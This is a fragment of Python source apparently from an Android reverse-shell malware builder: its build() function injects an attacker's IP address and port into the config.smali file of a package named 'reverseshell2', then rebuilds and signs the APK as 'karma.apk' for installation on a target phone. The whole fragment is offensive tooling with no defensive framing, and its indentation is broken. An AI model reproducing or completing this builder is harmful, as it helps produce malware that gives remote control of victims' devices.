
def build():
    editor = "Compiled_apk_files"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali"
        port = str(port)
        try:
            file = open(editor,"r").readlines()
            #Very much uncertaninity but cant think any other way to do it xD
            file[16]=file[16][:21]+"\""+ip+"\""+"\n"
            file[21]=file[21][:21]+"\""+port+"\""+"\n"
            str_file="".join([str(elem) for elem in file])
            open(editor,"w").write(str_file)
        except Exception as e:
            print(e)
            sys.exit()
        java_version = executeCMD("java -version")
        if java_version.stderr == "":
            print(Style.BRIGHT+Fore.RED+"\nJava Not Installed"+Fore.RESET)
        else:
            print(Style.BRIGHT+Fore.YELLOW+"\nGenerating apk file"+Fore.RESET)
            if args.output:
                outFileName = args.output
            else:
                outFileName = "karma.apk"
            done=False
            t = threading.Thread(target=animate,args=("Building ",))
            t.start()
            resOut = executeCMD("java -jar Jar_Files/apktool.jar b Compiled_apk_files  -o "+outFileName)
            done = True
            t.join()
            if not resOut.returncode:
                print(Style.BRIGHT+Fore.GREEN+"\rSuccessfully apk built "+getpwd(outFileName)+"\n"+Fore.RESET,end="")
                print(Style.BRIGHT+Fore.YELLOW+"\nSigning the apk"+Fore.RESET)
                done=False
                t = threading.Thread(target=animate,args=("Signing ",))
                t.start()
                resOut = executeCMD("java -jar Jar_Files/sign.jar "+outFileName+" --override")
                done = True
                t.join()
                if not resOut.returncode:
                    print(Fore.GREEN+"\rSuccessfully signed the apk "+outFileName+Fore.RESET,end="")
                    print(" ")
                else:
                    print("\r"+resOut.stderr)
                    print(Fore.RED+"Signing Failed"+Fore.RESET)    
            else:
                print("\r"+resOut.stderr)
                print(Fore.RED+"Building Failed"+Fore.RESET)